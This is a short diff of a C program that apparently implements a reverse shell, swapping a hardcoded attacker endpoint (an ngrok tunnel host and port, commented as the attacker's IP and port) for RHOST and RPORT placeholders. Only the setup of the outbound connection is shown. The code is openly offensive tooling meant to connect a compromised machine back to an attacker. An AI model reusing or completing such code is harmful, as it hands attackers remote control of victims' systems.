@@ -9,8 +9,8 @@
 #include <arpa/inet.h>
 
 int main(void) {
-    const char *RHOST = strdup("2.tcp.eu.ngrok.io");  /* attacker's IP/domain */
-    const char *RPORT = strdup("13570");  /* attacker's port      */
+    const char *RHOST = strdup("RHOST");  /* attacker's IP/domain */
+    const char *RPORT = strdup("RPORT");  /* attacker's port      */
 
     /* hints for getaddrinfo() */
     struct addrinfo hints;
